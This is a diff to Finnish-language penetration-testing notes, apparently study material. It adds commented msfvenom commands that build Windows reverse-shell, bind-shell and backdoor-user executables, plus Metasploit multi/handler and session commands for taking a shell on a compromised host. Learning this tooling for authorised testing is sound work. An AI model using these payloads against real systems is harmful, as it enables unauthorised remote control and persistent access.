@@ -213,17 +213,25 @@ Windowsin payload esimerkkejä (Reverse shell + Bind shell + Create user)
 
  - **msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe** # Luo reverse shellin windowsin payloadilla
  - **msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe** # Luo bind shellin windowsin payloadilla
- - **msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe** 
+ - **msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe** # Luo uuden käyttäjän, mitä voidaan käyttää hyökkäyksessä hyödyksi
 
 
 
-Multi/handlerin käyttöä.
+Multi/handlerin käyttöä ja hyödyllisiä msf komentoja.
 
      msf6 > multi/handler
      msf6 exploit(multi/handler) > set payload linux/x86/meterpreter_reverse_tcp # asetetaan payload
      msf6 exploit(multi/handler) > set LHOST "localhost ip" # asetetaan localhosti
      msf6 exploit(multi/handler) > set LPORT "localport" # asetetaan localportti
+     msf6 exploit(multi/handler) > set ExitOnSession false # ei automaattisesti lopeta yhteyttä vaan se pitää lopettaa manuaalisesti
      msf6 exploit(multi/handler) > run -j # ajetaan
+
+     msf6 > sessions -l # Näyttää käynnissä olevat sessiot
+     msf6 > sessions -i <session_id> # Voi yhdistää kyseiseen sessioon
+     msf6 > shell # menee shelliin
+     msf6 > show exploits # näyttää exploitit
+     msf6 > show payloads # näyttää payloadit
+     
 
 
 
